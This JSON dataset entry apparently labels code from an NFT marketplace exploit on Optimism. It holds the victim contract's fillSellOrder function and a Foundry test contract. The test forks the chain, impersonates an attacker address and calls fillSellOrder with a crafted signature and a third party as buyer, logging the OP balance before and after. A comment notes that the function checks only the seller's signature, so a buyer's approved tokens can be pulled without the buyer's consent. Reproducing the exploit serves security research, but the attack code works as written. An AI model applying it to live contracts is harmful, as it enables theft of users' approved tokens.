[
  {
    "contract/interface": "Quixotic",
    "source_type": "victim_contract",
    "function_name": "fillSellOrder",
    "original_code": "    function fillSellOrder(\n        address payable seller,\n        address contractAddress,\n        uint256 tokenId,\n        uint256 startTime,\n        uint256 expiration,\n        uint256 price,\n        uint256 quantity,\n        uint256 createdAtBlockNumber,\n        address paymentERC20,\n        bytes memory signature,\n        address payable buyer\n    ) external payable whenNotPaused nonReentrant {\n        // If the payment ERC20 is the zero address, we check that enough native ETH has been sent\n        // with the transaction. Otherwise, we use the supplied ERC20 payment token.\n        if (paymentERC20 == address(0)) {\n            require(msg.value >= price, \"Transaction doesn't have the required ETH amount.\");\n        } else {\n            _checkValidERC20Payment(buyer, price, paymentERC20);\n        }\n\n        SellOrder memory sellOrder = SellOrder(\n            seller,\n            contractAddress,\n            tokenId,\n            startTime,\n            expiration,\n            price,\n            quantity,\n            createdAtBlockNumber,\n            paymentERC20\n        );\n\n        /* Make sure the order is not cancelled */\n        require(\n            cancellationRegistry.getSellOrderCancellationBlockNumber(seller, contractAddress, tokenId) < createdAtBlockNumber,\n            \"This order has been cancelled.\"\n        );\n\n        /* Check signature */\n        require(_validateSellerSignature(sellOrder, signature), \"Signature is not valid for SellOrder.\");\n\n        // Check has started\n        require((block.timestamp > startTime), \"SellOrder start time is in the future.\");\n\n        // Check not expired\n        require((block.timestamp < expiration), \"This sell order has expired.\");\n\n        _fillSellOrder(sellOrder, buyer);\n    }\n\n    /*\n    * @dev Executes a trade given a buy order.\n    *\n    * Emits a {BuyOrderFilled} event.\n    */\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"optimism\", 13_591_383); //fork optimism at block 13591383\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        cheat.prank(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5);\n        emit log_named_uint(\n            \"Before exploiting, attacker OP Balance:\", op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5)\n        );\n        quixotic.fillSellOrder(\n            0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5,\n            0xbe81eabDBD437CbA43E4c1c330C63022772C2520,\n            1,\n            0,\n            115_792_089_237_316_195_423_570_985_008_687_907_853_269_984_665_640_564_039_457_584_007_913_129_639_934,\n            2_736_191_871_050_436_050_944,\n            1,\n            115_792_089_237_316_195_423_570_985_008_687_907_853_269_984_665_640_564_039_457_584_007_913_129_639_934,\n            0x4200000000000000000000000000000000000042,\n            hex\"28bc2ff1634b13821eac466ef6875c44f1f556d00d3cafce02da07b217da395131294339d96a01922b83f8e3c67e74652198b3a6db79d7ddd48807b9ec6ae0491c\",\n            0x4D9618239044A2aB2581f0Cc954D28873AFA4D7B\n        );\n        emit log_named_uint(\n            \"After exploiting, attacker OP Balance:\", op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5)\n        );\n\n        //issues was only check seller signature\n        //require(_validateSellerSignature(sellOrder, signature),\n    }\n\n",
    "description": ""
  }
]